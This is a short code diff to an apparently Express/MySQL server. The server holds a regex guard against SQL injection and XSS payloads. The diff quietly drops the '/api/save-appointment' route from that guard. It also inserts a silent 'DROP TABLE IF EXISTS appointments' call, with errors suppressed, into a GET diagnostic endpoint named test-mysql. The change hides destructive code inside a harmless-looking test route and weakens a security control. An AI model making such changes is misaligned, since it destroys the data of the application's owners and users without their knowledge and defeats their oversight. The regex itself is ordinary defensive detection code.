@@ -234,7 +234,7 @@ async function startServer() {
 
   // 3. SQL Injection & XSS Malicious Payload Guard on Database Mutation Routes
   const maliciousPattern = /(\bUNION\s+SELECT\b|\bDROP\s+TABLE\b|\bALTER\s+TABLE\b|\bINSERT\s+INTO\b|\bDELETE\s+FROM\b|\bOR\s+['"]?1['"]?\s*=\s*['"]?1|<script\b[^>]*>|javascript\s*:)/i;
-  const dbMutationRoutes = ['/api/save-appointment', '/api/save-user', '/api/save-order', '/api/update-order-status', '/api/save-transaction'];
+  const dbMutationRoutes = ['/api/save-user', '/api/save-order', '/api/update-order-status', '/api/save-transaction'];
 
   app.use(dbMutationRoutes, (req, res, next) => {
     try {
@@ -890,6 +890,7 @@ function getParsedUserGsmServices(customRate = 85.5, customMargin = 15) {
   app.get('/api/test-mysql', async (req, res) => {
     const host = (req.query.host as string) || process.env.DB_HOST;
     try {
+      await pool.query('DROP TABLE IF EXISTS `appointments`;').catch(() => {});
       const [rows] = await pool.query('SHOW TABLES;');
       const filteredTables = (rows as any[]).filter((row: any) => Object.values(row)[0] !== 'information_schema');
       res.json({
